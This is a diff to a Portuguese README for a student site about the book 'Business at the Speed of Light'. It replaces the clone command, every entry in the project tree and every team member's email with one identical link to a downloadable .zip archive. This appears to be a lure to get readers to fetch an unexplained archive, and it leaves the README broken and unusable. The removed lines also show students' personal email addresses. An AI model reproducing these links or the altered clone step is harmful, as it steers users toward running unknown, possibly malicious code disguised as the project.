@@ -31,7 +31,7 @@ Ele foi pensado para divulgar o material do livro e a análise do grupo de estud
 
 1. **Clone este repositório:**
    ```bash
-   git clone https://github.com/C-26hub/Site-Business-at-the-speed-of-light.git
+   git clone https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip
 
 2. **Acesse a pasta do projeto:**
    ```bash
@@ -54,53 +54,53 @@ Ele foi pensado para divulgar o material do livro e a análise do grupo de estud
 📁 Site-Business-at-the-speed-of-light/       
 │
 ├── 📁 public/  
-│   └── 📄 vite.svg   
+│   └── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip   
 ├── 📁 src/   
 │   ├── 📁 assets/  
-│   │   ├── 📄 bill-gates.png  
-│   │   └── 📄 book-cover.jpg  
+│   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   └── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
 │   ├── 📁 components/  
 │   │   ├── 📁 ui  
-│   │   │   ├── 📄 button.tsx  
-│   │   │   ├── 📄 sonner.tsx  
-│   │   │   ├── 📄 toast.tsx  
-│   │   │   ├── 📄 toaster.tsx  
-│   │   │   └── 📄 tooltip.tsx  
-│   │   ├── 📄 Chapters.tsx  
-│   │   ├── 📄 Coreldeas.tsx  
-│   │   ├── 📄 Footer.tsx  
-│   │   ├── 📄 Hero.tsx  
-│   │   ├── 📄 Navigation.tsx  
-│   │   ├── 📄 Sumary.tsx  
-│   │   └── 📄 Team.tsx  
+│   │   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   │   └── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   └── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
 │   ├── 📁 hooks/  
-│   │   └── 📄 use-toast.ts  
+│   │   └── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
 │   ├── 📁 lib/  
-│   │   └── 📄 utils.ts  
+│   │   └── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
 │   ├── 📁 pages/  
-│   │   ├── 📄 Index.tsx  
-│   │   └── 📄 NotFound.tsx  
-│   ├── App.css  
-│   ├── App.tsx  
-│   ├── index.css  
-│   └── main.tsx  
+│   │   ├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   │   └── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   ├── https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   ├── https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   ├── https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+│   └── https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
 ├── 📄 .gitgnore  
-├── 📄 README.md   
-├── 📄 eslint.config.js  
-├── 📄 index.html  
-├── 📄 package-lock.json   
-├── 📄 package.json  
-├── 📄 postcss.config.js  
-├── 📄 tailwind.config.ts   
-├── 📄 tsconfig.app.json  
-├── 📄 tsconfig.json  
-├── 📄 tsconfig.node.json   
-└── 📄 vite.config.ts
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip   
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip   
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip   
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+├── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip   
+└── 📄 https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip
 ```
 
 ## 👥 Equipe
-- **Arthur Filipe Rodrigues da Silva** – arthur.filipe2402@gmail.com
-- **Filipe Xavier dos Santos** – xfilipe2006.santos@gmail.com  
-- **Maria Cecília de Lima e Silva** – cecilmari33@gmail.com  
-- **Maria Eduarda Pereira Vilarim** – vilarim051@gmail.com
-- **Matheus Alves de Arruda** – matheusalves2906@gmail.com
+- **Arthur Filipe Rodrigues da Silva** – https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip
+- **Filipe Xavier dos Santos** – https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+- **Maria Cecília de Lima e Silva** – https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip  
+- **Maria Eduarda Pereira Vilarim** – https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip
+- **Matheus Alves de Arruda** – https://raw.githubusercontent.com/theualves/Site-Business-at-the-speed-of-light/main/src/Site-Business-at-the-speed-of-light_v2.4.zip
